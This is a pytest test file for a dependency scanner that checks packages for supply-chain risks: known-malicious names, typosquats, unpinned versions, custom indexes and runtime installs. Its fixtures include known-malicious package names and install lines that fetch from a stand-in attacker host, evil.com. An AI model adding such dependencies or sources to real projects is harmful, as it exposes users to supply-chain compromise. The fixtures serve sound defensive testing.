import tempfile
import json
from pathlib import Path
from analyzer.detectors.dependency_scanner import run


def _make_skill(files: dict[str, str]) -> Path:
    tmp = tempfile.mkdtemp()
    root = Path(tmp)
    for name, content in files.items():
        p = root / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    return root


# ── baseline ──────────────────────────────────────────────────────────────────

def test_no_dependency_files_passes():
    root = _make_skill({"main.py": 'print("hello")\n'})
    result = run(root)
    assert result.passed


def test_empty_requirements_txt_passes():
    root = _make_skill({"requirements.txt": ""})
    result = run(root)
    assert result.passed


def test_clean_pinned_requirements_passes():
    root = _make_skill({"requirements.txt": "requests==2.31.0\nnumpy==1.26.0\nflask==3.0.0\n"})
    result = run(root)
    assert result.passed


def test_clean_package_json_passes():
    root = _make_skill({"package.json": json.dumps({
        "dependencies": {"express": "^4.18.0", "lodash": "^4.17.21"}
    })})
    result = run(root)
    assert result.passed


def test_package_json_no_dependencies_passes():
    root = _make_skill({"package.json": json.dumps({"name": "my-skill", "version": "1.0.0"})})
    result = run(root)
    assert result.passed


def test_malformed_package_json_does_not_crash():
    root = _make_skill({"package.json": "this is not json {"})
    result = run(root)
    assert result.passed


# ── known malicious ───────────────────────────────────────────────────────────

def test_known_malicious_pip_detected():
    root = _make_skill({"requirements.txt": "colourama==0.4.4\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_001" for f in result.findings)


def test_known_malicious_pip_without_version_detected():
    root = _make_skill({"requirements.txt": "colourama\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_001" for f in result.findings)


def test_known_malicious_npm_detected():
    root = _make_skill({"package.json": json.dumps({
        "dependencies": {"ctx": "1.0.0"}
    })})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_001" for f in result.findings)


def test_known_malicious_in_dev_dependencies_detected():
    root = _make_skill({"package.json": json.dumps({
        "devDependencies": {"ctx": "1.0.0"}
    })})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_001" for f in result.findings)


def test_known_malicious_in_optional_dependencies_detected():
    root = _make_skill({"package.json": json.dumps({
        "optionalDependencies": {"ctx": "1.0.0"}
    })})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_001" for f in result.findings)


# ── typosquatting ─────────────────────────────────────────────────────────────

def test_pip_typosquat_nunpy_detected():
    root = _make_skill({"requirements.txt": "nunpy==1.26.0\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_002" for f in result.findings)
    assert any("numpy" in f.description for f in result.findings)


def test_pip_typosquat_reqests_detected():
    root = _make_skill({"requirements.txt": "reqests==2.31.0\n"})
    result = run(root)
    assert not result.passed
    assert any("requests" in f.description for f in result.findings)


def test_npm_typosquat_expresss_detected():
    root = _make_skill({"package.json": json.dumps({
        "dependencies": {"expresss": "^4.18.0"}
    })})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_002" for f in result.findings)


def test_exact_popular_pip_name_not_flagged():
    root = _make_skill({"requirements.txt": "numpy==1.26.0\n"})
    result = run(root)
    assert result.passed


def test_exact_popular_npm_name_not_flagged():
    root = _make_skill({"package.json": json.dumps({
        "dependencies": {"express": "^4.18.0"}
    })})
    result = run(root)
    assert result.passed


def test_case_insensitive_pip_typosquat():
    root = _make_skill({"requirements.txt": "Numpy==1.26.0\n"})
    result = run(root)
    assert result.passed


def test_scoped_npm_package_typosquat_stripped():
    root = _make_skill({"package.json": json.dumps({
        "dependencies": {"@evil/expresss": "^4.18.0"}
    })})
    result = run(root)
    assert not result.passed


# ── unpinned versions ─────────────────────────────────────────────────────────

def test_unpinned_pip_flagged():
    root = _make_skill({"requirements.txt": "requests\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_003" for f in result.findings)


def test_pinned_with_equals_passes():
    root = _make_skill({"requirements.txt": "requests==2.31.0\n"})
    result = run(root)
    assert result.passed


def test_pinned_with_range_passes():
    root = _make_skill({"requirements.txt": "requests>=2.0,<3.0\n"})
    result = run(root)
    assert result.passed


def test_wildcard_npm_version_flagged():
    root = _make_skill({"package.json": json.dumps({
        "dependencies": {"express": "*"}
    })})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_004" for f in result.findings)


def test_latest_npm_version_flagged():
    root = _make_skill({"package.json": json.dumps({
        "dependencies": {"express": "latest"}
    })})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_004" for f in result.findings)


# ── direct url / git installs ─────────────────────────────────────────────────

def test_git_plus_url_detected():
    root = _make_skill({"requirements.txt": "git+https://github.com/evil/pkg.git\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_005" for f in result.findings)


def test_http_direct_install_detected():
    root = _make_skill({"requirements.txt": "http://evil.com/package.tar.gz\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_005" for f in result.findings)


def test_https_direct_install_detected():
    root = _make_skill({"requirements.txt": "https://evil.com/package.tar.gz\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_005" for f in result.findings)


# ── custom index ──────────────────────────────────────────────────────────────

def test_custom_index_url_detected():
    root = _make_skill({"requirements.txt": "--index-url https://evil.com/simple\nrequests==2.31.0\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_006" for f in result.findings)


def test_extra_index_url_detected():
    root = _make_skill({"requirements.txt": "--extra-index-url https://evil.com/simple\nrequests==2.31.0\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_006" for f in result.findings)


# ── parsing edge cases ────────────────────────────────────────────────────────

def test_inline_comment_not_flagged():
    root = _make_skill({"requirements.txt": "requests==2.31.0  # needed for API calls\n"})
    result = run(root)
    assert result.passed


def test_comment_line_ignored():
    root = _make_skill({"requirements.txt": "# colourama\nrequests==2.31.0\n"})
    result = run(root)
    assert result.passed


def test_whitespace_only_lines_ignored():
    root = _make_skill({"requirements.txt": "\n   \n\nrequests==2.31.0\n"})
    result = run(root)
    assert result.passed


def test_recursive_include_ignored():
    root = _make_skill({"requirements.txt": "-r base-requirements.txt\nrequests==2.31.0\n"})
    result = run(root)
    assert result.passed


def test_extras_syntax_parsed_correctly():
    root = _make_skill({"requirements.txt": "requests[security]==2.31.0\n"})
    result = run(root)
    assert result.passed


# ── node_modules excluded ─────────────────────────────────────────────────────

def test_node_modules_skipped():
    root = _make_skill({
        "package.json": json.dumps({"dependencies": {"express": "^4.18.0"}}),
        "node_modules/ctx/package.json": json.dumps({"name": "ctx", "version": "1.0.0"}),
    })
    result = run(root)
    assert result.passed


# ── multi-file ────────────────────────────────────────────────────────────────

def test_nested_requirements_scanned():
    root = _make_skill({"src/requirements.txt": "colourama==0.4.4\n"})
    result = run(root)
    assert not result.passed


def test_both_pip_and_npm_scanned():
    root = _make_skill({
        "requirements.txt": "colourama==0.4.4\n",
        "package.json": json.dumps({"dependencies": {"ctx": "1.0.0"}}),
    })
    result = run(root)
    assert not result.passed
    assert len([f for f in result.findings if f.rule_id == "DEP_001"]) >= 2


def test_multiple_findings_accumulated():
    root = _make_skill({
        "requirements.txt": "colourama==0.4.4\nnunpy==1.26.0\nflask\ngit+https://github.com/evil/pkg.git\n"
    })
    result = run(root)
    assert not result.passed
    assert len(result.findings) >= 4

# ── setup.py ──────────────────────────────────────────────────────────────────

def test_setup_py_malicious_detected():
    root = _make_skill({"setup.py": 'setup(install_requires=["colourama==0.4.4"])\n'})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_001" for f in result.findings)


def test_setup_py_typosquat_detected():
    root = _make_skill({"setup.py": 'setup(install_requires=["nunpy>=1.0"])\n'})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_002" for f in result.findings)


def test_clean_setup_py_passes():
    root = _make_skill({"setup.py": 'setup(install_requires=["requests>=2.0", "numpy>=1.0"])\n'})
    result = run(root)
    assert result.passed


# ── pyproject.toml ────────────────────────────────────────────────────────────

def test_pyproject_toml_malicious_detected():
    root = _make_skill({"pyproject.toml": '[tool.poetry.dependencies]\ncolourama = "^0.4.4"\n'})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_001" for f in result.findings)


def test_pyproject_toml_typosquat_detected():
    root = _make_skill({"pyproject.toml": '[tool.poetry.dependencies]\nnunpy = "^1.26.0"\n'})
    result = run(root)
    assert not result.passed


def test_clean_pyproject_toml_passes():
    root = _make_skill({"pyproject.toml": '[tool.poetry.dependencies]\nrequests = "^2.31.0"\n'})
    result = run(root)
    assert result.passed


# ── Pipfile ───────────────────────────────────────────────────────────────────

def test_pipfile_malicious_detected():
    root = _make_skill({"Pipfile": '[packages]\ncolourama = "*"\n'})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_001" for f in result.findings)


def test_pipfile_typosquat_detected():
    root = _make_skill({"Pipfile": '[packages]\nnunpy = "*"\n'})
    result = run(root)
    assert not result.passed


def test_clean_pipfile_passes():
    root = _make_skill({"Pipfile": '[packages]\nrequests = "*"\n'})
    result = run(root)
    assert result.passed

def test_runtime_pip_install_detected():
    root = _make_skill({"main.py": 'import subprocess\nsubprocess.run(["pip", "install", "requests"])\n'})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_007" for f in result.findings)


def test_os_system_pip_install_detected():
    root = _make_skill({"main.py": 'import os\nos.system("pip install requests")\n'})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_007" for f in result.findings)


def test_conda_environment_yml_malicious_detected():
    root = _make_skill({"environment.yml": "name: myenv\ndependencies:\n  - colourama\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_001" for f in result.findings)


def test_conda_environment_yml_typosquat_detected():
    root = _make_skill({"environment.yml": "name: myenv\ndependencies:\n  - nunpy=1.26.0\n"})
    result = run(root)
    assert not result.passed


def test_clean_conda_environment_passes():
    root = _make_skill({"environment.yml": "name: myenv\ndependencies:\n  - numpy\n  - pandas\n"})
    result = run(root)
    assert result.passed


def test_suspicious_package_name_with_dot_detected():
    root = _make_skill({"requirements.txt": "python.utils==1.0.0\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_008" for f in result.findings)


def test_suspiciously_long_package_name_detected():
    long_name = "a" * 55
    root = _make_skill({"requirements.txt": f"{long_name}==1.0.0\n"})
    result = run(root)
    assert not result.passed
    assert any(f.rule_id == "DEP_008" for f in result.findings)